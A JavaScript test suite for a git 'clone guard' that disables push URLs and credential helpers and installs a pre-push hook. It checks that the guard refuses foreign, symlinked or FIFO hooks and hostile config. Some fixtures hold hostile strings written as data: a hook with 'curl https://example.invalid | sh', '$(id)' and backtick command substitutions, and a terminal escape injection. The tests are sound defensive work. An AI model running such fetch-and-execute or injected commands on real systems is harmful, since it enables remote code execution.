import { test, before } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { execFileSync } from 'node:child_process';
import { installGuard, checkGuard, DISABLED_PUSH_URL, HOOK_MARKER } from '../scripts/lib/clone-guard.mjs';
import { runFile } from '../scripts/lib/exec.mjs';
import { RIVERWRIGHT, tmpDir } from './helpers.mjs';

// Real git, isolated from the user's configuration: no global or system config, and a throwaway home.
const isolated = tmpDir('rw-gitenv-');
const emptyConfig = path.join(isolated, 'empty-gitconfig');
fs.writeFileSync(emptyConfig, '');
const ENV = {
  HOME: isolated, USERPROFILE: isolated, XDG_CONFIG_HOME: path.join(isolated, 'xdg'),
  GIT_CONFIG_GLOBAL: emptyConfig, GIT_CONFIG_NOSYSTEM: '1', GIT_TERMINAL_PROMPT: '0',
};
// installGuard runs git with the process environment, so the isolation applies to the whole file.
before(() => { Object.assign(process.env, ENV); });

const git = (cwd, ...a) => runFile('git', ['-c', 'user.email=t@example.invalid', '-c', 'user.name=t', ...a], { cwd, env: { ...process.env } });
const posixOnly = { skip: process.platform === 'win32' };

async function clone({ remotes = { origin: 'https://github.com/ruvnet/ruflo.git' } } = {}) {
  const dir = tmpDir('rw-clone-');
  await git(dir, 'init', '-q');
  await git(dir, 'commit', '-q', '--allow-empty', '-m', 'init');
  for (const [name, url] of Object.entries(remotes)) await git(dir, 'remote', 'add', name, url);
  return dir;
}
const home = () => path.join(tmpDir('rw-user-'), 'Riverwright Home');
const hookOf = (dir) => path.join(dir, '.git', 'hooks', 'pre-push');
const install = (dir, h = home()) => installGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: h });
const writeHook = (dir, text) => { fs.mkdirSync(path.dirname(hookOf(dir)), { recursive: true }); fs.writeFileSync(hookOf(dir), text); };

test('installGuard disables every push URL, empties the credential helper and installs the pre-push hook', async () => {
  const dir = await clone({ remotes: { origin: 'https://github.com/ruvnet/ruflo.git', upstream: 'https://github.com/other/ruflo.git' } });
  const h = home();
  const r = await install(dir, h);
  assert.deepEqual(r.remotesDisabled.sort(), ['origin', 'upstream']);
  for (const name of ['origin', 'upstream']) {
    assert.equal((await git(dir, 'remote', 'get-url', '--push', name)).stdout.trim(), DISABLED_PUSH_URL);
  }
  assert.equal((await git(dir, 'remote', 'get-url', 'origin')).stdout.trim(), 'https://github.com/ruvnet/ruflo.git', 'fetch URL is untouched');
  assert.deepEqual((await git(dir, 'config', '--local', '--get-all', 'credential.helper')).stdout.split('\n').slice(0, -1), ['']);
  const hook = fs.readFileSync(hookOf(dir), 'utf8');
  assert.match(hook, new RegExp(HOOK_MARKER));
  assert.ok(hook.includes(`--home "${h.replace(/\\/g, '/')}"`));
  if (process.platform !== 'win32') assert.equal(fs.statSync(hookOf(dir)).mode & 0o111, 0o111);
});

test('a push from the guarded clone fails before it reaches any network', posixOnly, async () => {
  const dir = await clone();
  await install(dir);
  const r = await git(dir, 'push', 'origin', 'HEAD:refs/heads/riverwright/1-x');
  assert.notEqual(r.code, 0);
  assert.match(r.stderr, /DISABLED_BY_RIVERWRIGHT|does not appear to be a git repository/);
});

test('installing again changes nothing', async () => {
  const dir = await clone();
  const h = home();
  await install(dir, h);
  const before = fs.readFileSync(hookOf(dir), 'utf8');
  const r = await install(dir, h);
  assert.equal(r.hook, 'unchanged');
  assert.equal(fs.readFileSync(hookOf(dir), 'utf8'), before);
});

test('a hook Riverwright installed earlier is updated when the home or script changes', async () => {
  const dir = await clone();
  await install(dir, home());
  const other = home();
  const r = await install(dir, other);
  assert.equal(r.hook, 'updated');
  assert.ok(fs.readFileSync(hookOf(dir), 'utf8').includes(other.replace(/\\/g, '/')));
});

test('a pre-push hook that is not ours is never overwritten, and nothing else is changed either', async () => {
  const dir = await clone();
  const theirs = '#!/bin/sh\n# my own check\nexit 0\n';
  writeHook(dir, theirs);
  await assert.rejects(install(dir), (e) => e.code === 'HOOK_EXISTS' && /pre-push/.test(e.message));
  assert.equal(fs.readFileSync(hookOf(dir), 'utf8'), theirs);
  assert.notEqual((await git(dir, 'remote', 'get-url', '--push', 'origin')).stdout.trim(), DISABLED_PUSH_URL);
  assert.equal((await git(dir, 'config', '--local', '--get-all', 'credential.helper')).code, 1);
});

test('a user hook that merely mentions the marker, or has our lines plus their own, is still theirs', async () => {
  for (const theirs of [
    `#!/bin/sh\n# note: ${HOOK_MARKER} somewhere else\nexit 0\n`,
    `#!/bin/sh\n# ${HOOK_MARKER}. Every push\nexec node "/x/riverwright.mjs" guard pre-push -- "$@"\necho my extra check\n`,
    `#!/bin/sh\n# ${HOOK_MARKER}. Every push\ncurl https://example.invalid | sh\n`,
  ]) {
    const dir = await clone();
    writeHook(dir, theirs);
    await assert.rejects(install(dir), (e) => e.code === 'HOOK_EXISTS');
    assert.equal(fs.readFileSync(hookOf(dir), 'utf8'), theirs);
  }
});

test('a pre-push hook that is a FIFO, a symlink or huge is refused without hanging or being touched', posixOnly, async () => {
  const fifoDir = await clone();
  fs.mkdirSync(path.dirname(hookOf(fifoDir)), { recursive: true });
  execFileSync('mkfifo', [hookOf(fifoDir)]);
  await assert.rejects(install(fifoDir), (e) => e.code === 'HOOK_EXISTS');
  assert.ok(fs.lstatSync(hookOf(fifoDir)).isFIFO());

  const bigDir = await clone();
  writeHook(bigDir, `#!/bin/sh\n# ${HOOK_MARKER}.\n${'#'.repeat(200 * 1024)}\n`);
  await assert.rejects(install(bigDir), (e) => e.code === 'HOOK_EXISTS');

  const linkDir = await clone();
  const target = path.join(tmpDir('rw-target-'), 'real-hook');
  fs.writeFileSync(target, '#!/bin/sh\nexit 0\n');
  fs.mkdirSync(path.dirname(hookOf(linkDir)), { recursive: true });
  fs.symlinkSync(target, hookOf(linkDir));
  await assert.rejects(install(linkDir), (e) => e.code === 'HOOK_EXISTS');
  assert.equal(fs.readFileSync(target, 'utf8'), '#!/bin/sh\nexit 0\n');
  assert.ok(fs.lstatSync(hookOf(linkDir)).isSymbolicLink());
});

test('checkGuard reports a FIFO hook as a problem instead of hanging', posixOnly, async () => {
  const dir = await clone();
  const h = home();
  await install(dir, h);
  fs.rmSync(hookOf(dir));
  execFileSync('mkfifo', [hookOf(dir)]);
  const r = await checkGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: h });
  assert.equal(r.ok, false);
  assert.match(r.problems.join(' | '), /pre-push hook/);
});

test('a core.hooksPath setting is refused, because the hook would not run from where we write it', async () => {
  const dir = await clone();
  await git(dir, 'config', '--local', 'core.hooksPath', '/tmp/somewhere');
  await assert.rejects(install(dir), (e) => e.code === 'HOOKS_PATH_SET');
  assert.equal(fs.existsSync(hookOf(dir)), false);
});

test('a core.hooksPath in the global configuration is refused too', async () => {
  const dir = await clone();
  const globalCfg = path.join(tmpDir('rw-gcfg-'), 'gitconfig');
  fs.writeFileSync(globalCfg, '[core]\n\thooksPath = /tmp/elsewhere\n');
  const prev = process.env.GIT_CONFIG_GLOBAL;
  process.env.GIT_CONFIG_GLOBAL = globalCfg;
  try {
    await assert.rejects(install(dir), (e) => e.code === 'HOOKS_PATH_SET');
  } finally {
    process.env.GIT_CONFIG_GLOBAL = prev;
  }
  assert.equal(fs.existsSync(hookOf(dir)), false);
});

test('a directory that is not a git repository is refused', async () => {
  await assert.rejects(install(tmpDir()), (e) => e.code === 'NOT_A_REPO');
});

test('a linked worktree gets the guard through the shared hooks directory', async () => {
  const dir = await clone();
  const wt = path.join(tmpDir('rw-wt-'), 'issue-1');
  const added = await git(dir, 'worktree', 'add', '-q', '-b', 'riverwright/1-x', wt);
  assert.equal(added.code, 0, added.stderr);
  assert.ok(fs.statSync(path.join(wt, '.git')).isFile(), '.git is a file in a linked worktree');
  await install(wt);
  assert.equal(fs.existsSync(hookOf(dir)), true);
});

test('every push URL of a remote is disabled, even when it had several', async () => {
  const dir = await clone();
  await git(dir, 'remote', 'set-url', '--add', '--push', 'origin', 'https://github.com/a/b.git');
  await git(dir, 'remote', 'set-url', '--add', '--push', 'origin', 'https://github.com/c/d.git');
  await install(dir);
  assert.deepEqual((await git(dir, 'remote', 'get-url', '--push', '--all', 'origin')).stdout.trim().split('\n'), [DISABLED_PUSH_URL]);
});

test('GIT_DIR and friends in the environment cannot send the installer to another repository', async () => {
  const dir = await clone();
  const other = await clone();
  const prev = { GIT_DIR: process.env.GIT_DIR, GIT_WORK_TREE: process.env.GIT_WORK_TREE };
  process.env.GIT_DIR = path.join(other, '.git');
  process.env.GIT_WORK_TREE = other;
  try {
    await install(dir);
  } finally {
    for (const [k, v] of Object.entries(prev)) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  }
  assert.equal(fs.existsSync(hookOf(dir)), true);
  assert.equal(fs.existsSync(hookOf(other)), false);
});

test('a relative home is refused before anything changes', async () => {
  const dir = await clone();
  await assert.rejects(installGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: 'relative/home' }), (e) => ['BAD_HOME', 'UNSAFE_PATH'].includes(e.code));
  assert.equal(fs.existsSync(hookOf(dir)), false);
  assert.notEqual((await git(dir, 'remote', 'get-url', '--push', 'origin')).stdout.trim(), DISABLED_PUSH_URL);
});

test('error messages print file-sourced text without control characters', posixOnly, async () => {
  const dir = await clone();
  await git(dir, 'config', '--local', 'core.hooksPath', '/tmp/x\u001b[2Jy');
  await assert.rejects(install(dir), (e) => e.code === 'HOOKS_PATH_SET' && !/\u001b/.test(e.message));
});

test('checkGuard passes after install and names what changed afterwards', async () => {
  const dir = await clone();
  const h = home();
  await install(dir, h);
  assert.deepEqual(await checkGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: h }), { ok: true, problems: [] });
  await git(dir, 'remote', 'set-url', '--push', 'origin', 'https://github.com/x/y.git');
  await git(dir, 'config', '--local', '--add', 'credential.helper', 'store');
  fs.rmSync(hookOf(dir));
  const bad = await checkGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: h });
  assert.equal(bad.ok, false);
  assert.match(bad.problems.join(' | '), /push URL/);
  assert.match(bad.problems.join(' | '), /credential helper/);
  assert.match(bad.problems.join(' | '), /pre-push hook/);
});

test('checkGuard notices a second push URL on a remote', async () => {
  const dir = await clone();
  const h = home();
  await install(dir, h);
  await git(dir, 'remote', 'set-url', '--add', '--push', 'origin', 'https://github.com/x/y.git');
  const bad = await checkGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: h });
  assert.equal(bad.ok, false);
  assert.match(bad.problems.join(' | '), /push URL/);
});

// ---- Fix round 1 (review findings I1 to I4, M1 to M6) ----
const check = (dir, h) => checkGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT, home: h });
const noChange = async (dir) => {
  assert.equal(fs.existsSync(hookOf(dir)), false);
  assert.notEqual((await git(dir, 'remote', 'get-url', '--push', 'origin')).stdout.trim(), DISABLED_PUSH_URL);
  assert.equal((await git(dir, 'config', '--local', '--get-all', 'credential.helper')).code, 1);
};

test('I1: an empty or blank core.hooksPath is refused before any change, and checkGuard reports it', async () => {
  for (const value of ['', '   ']) {
    const dir = await clone();
    await git(dir, 'config', '--local', 'core.hooksPath', value);
    await assert.rejects(install(dir), (e) => e.code === 'HOOKS_PATH_SET');
    await noChange(dir);
  }
  const dir = await clone();
  const h = home();
  await install(dir, h);
  await git(dir, 'config', '--local', 'core.hooksPath', '');
  const bad = await check(dir, h);
  assert.equal(bad.ok, false);
  assert.match(bad.problems.join(' | '), /core\.hooksPath/);
});

test('I2: a hook that is not executable is reported by checkGuard and repaired by installGuard', posixOnly, async () => {
  const dir = await clone();
  const h = home();
  await install(dir, h);
  fs.chmodSync(hookOf(dir), 0o644);
  const bad = await check(dir, h);
  assert.equal(bad.ok, false);
  assert.match(bad.problems.join(' | '), /executable/);
  const r = await install(dir, h);
  assert.equal(r.hook, 'updated');
  assert.equal(fs.statSync(hookOf(dir)).mode & 0o100, 0o100);
  assert.deepEqual(await check(dir, h), { ok: true, problems: [] });
});

test('I3: a plain subdirectory of another repository is refused with nothing changed', async () => {
  const outer = await clone();
  const sub = path.join(outer, 'sub', 'x');
  fs.mkdirSync(sub, { recursive: true });
  await assert.rejects(installGuard({ cloneDir: sub, scriptPath: RIVERWRIGHT, home: home() }), (e) => e.code === 'NOT_CLONE_ROOT');
  await assert.rejects(checkGuard({ cloneDir: sub, scriptPath: RIVERWRIGHT, home: home() }), (e) => e.code === 'NOT_CLONE_ROOT');
  await noChange(outer);
});

test('I4: checkGuard sees helpers from other scopes and URL-scoped helpers after the empty reset', async () => {
  const h = home();
  const local = await clone();
  await install(local, h);
  await git(local, 'config', '--local', 'credential.https://github.com.helper', 'store');
  assert.match((await check(local, h)).problems.join(' | '), /credential helper/);

  const viaInclude = await clone();
  await install(viaInclude, h);
  const inc = path.join(tmpDir('rw-inc-'), 'extra.cfg');
  fs.writeFileSync(inc, '[credential]\n\thelper = store\n');
  await git(viaInclude, 'config', '--local', 'include.path', inc);
  assert.match((await check(viaInclude, h)).problems.join(' | '), /credential helper/);

  const viaEnv = await clone();
  await install(viaEnv, h);
  const prev = { c: process.env.GIT_CONFIG_COUNT, k: process.env.GIT_CONFIG_KEY_0, v: process.env.GIT_CONFIG_VALUE_0 };
  Object.assign(process.env, { GIT_CONFIG_COUNT: '1', GIT_CONFIG_KEY_0: 'credential.helper', GIT_CONFIG_VALUE_0: 'store' });
  try {
    assert.match((await check(viaEnv, h)).problems.join(' | '), /credential helper/);
  } finally {
    for (const [k, v] of [['GIT_CONFIG_COUNT', prev.c], ['GIT_CONFIG_KEY_0', prev.k], ['GIT_CONFIG_VALUE_0', prev.v]]) { if (v === undefined) delete process.env[k]; else process.env[k] = v; }
  }

  // A helper in the global file comes before the local reset, so it is neutralised and is not a problem.
  const globalCfg = path.join(tmpDir('rw-gcfg-'), 'gitconfig');
  fs.writeFileSync(globalCfg, '[credential]\n\thelper = store\n');
  const fine = await clone();
  const prevG = process.env.GIT_CONFIG_GLOBAL;
  process.env.GIT_CONFIG_GLOBAL = globalCfg;
  try {
    await install(fine, h);
    assert.deepEqual(await check(fine, h), { ok: true, problems: [] });
  } finally {
    process.env.GIT_CONFIG_GLOBAL = prevG;
  }
});

test('I4: install removes local URL-scoped helpers so the reset really is last', async () => {
  const dir = await clone();
  const h = home();
  await git(dir, 'config', '--local', 'credential.helper', 'cache');
  await git(dir, 'config', '--local', 'credential.https://github.com.helper', 'store');
  await git(dir, 'config', '--local', '--add', 'credential.helper', 'osxkeychain');
  await install(dir, h);
  assert.deepEqual(await check(dir, h), { ok: true, problems: [] });
});

test('M1: a hook with command substitution or a backtick in the script path is not ours', async () => {
  for (const line of ['exec node "$(id)" guard pre-push -- "$@"', 'exec node "`id`" guard pre-push -- "$@"', 'exec node "/x/a%b" guard pre-push -- "$@"']) {
    const dir = await clone();
    const theirs = `#!/bin/sh\n# ${HOOK_MARKER}. Every push\n${line}\n`;
    writeHook(dir, theirs);
    await assert.rejects(install(dir), (e) => e.code === 'HOOK_EXISTS');
    assert.equal(fs.readFileSync(hookOf(dir), 'utf8'), theirs);
  }
});

test('M2: a symlinked hook is never followed, even when its target is our exact text', posixOnly, async () => {
  const dir = await clone();
  const h = home();
  const other = await clone();
  await install(other, h);
  const target = hookOf(other);
  fs.mkdirSync(path.dirname(hookOf(dir)), { recursive: true });
  fs.symlinkSync(target, hookOf(dir));
  await assert.rejects(install(dir, h), (e) => e.code === 'HOOK_EXISTS' && /symbolic link/.test(e.message));
  assert.ok(fs.lstatSync(hookOf(dir)).isSymbolicLink());
  assert.match((await check(dir, h)).problems.join(' | '), /pre-push hook/);
});

test('M3: a push URL that is rewritten by insteadOf after install is refused and reported', async () => {
  const dir = await clone();
  const bare = tmpDir('rw-bare-');
  await git(dir, 'config', '--local', `url.${bare}.insteadOf`, DISABLED_PUSH_URL);
  await assert.rejects(install(dir), (e) => e.code === 'GIT_FAILED' && /push URL/.test(e.message));
});

test('M4: a push URL or a remote that exists only in the global configuration is refused before any change', async () => {
  const globalCfg = path.join(tmpDir('rw-gcfg-'), 'gitconfig');
  fs.writeFileSync(globalCfg, '[remote "origin"]\n\tpushurl = https://glob.invalid/evil.git\n[remote "ghost"]\n\turl = https://glob.invalid/ghost.git\n');
  const prev = process.env.GIT_CONFIG_GLOBAL;
  process.env.GIT_CONFIG_GLOBAL = globalCfg;
  try {
    const dir = await clone();
    await assert.rejects(install(dir), (e) => e.code === 'REMOTE_OUTSIDE_CLONE' && /global/.test(e.message));
    await noChange(dir);
  } finally {
    process.env.GIT_CONFIG_GLOBAL = prev;
  }
  const dir2 = await clone();
  fs.writeFileSync(globalCfg, '[remote "ghost"]\n\turl = https://glob.invalid/ghost.git\n');
  process.env.GIT_CONFIG_GLOBAL = globalCfg;
  try {
    await assert.rejects(install(dir2), (e) => e.code === 'REMOTE_OUTSIDE_CLONE' && /ghost/.test(e.message));
    await noChange(dir2);
  } finally {
    process.env.GIT_CONFIG_GLOBAL = prev;
  }
});

test('M6: home is required and the script must exist, both checked before any change', async () => {
  const dir = await clone();
  await assert.rejects(installGuard({ cloneDir: dir, scriptPath: RIVERWRIGHT }), (e) => e.code === 'BAD_HOME');
  await assert.rejects(installGuard({ cloneDir: dir, scriptPath: path.join(tmpDir(), 'missing.mjs'), home: home() }), (e) => e.code === 'BAD_SCRIPT');
  await noChange(dir);
});
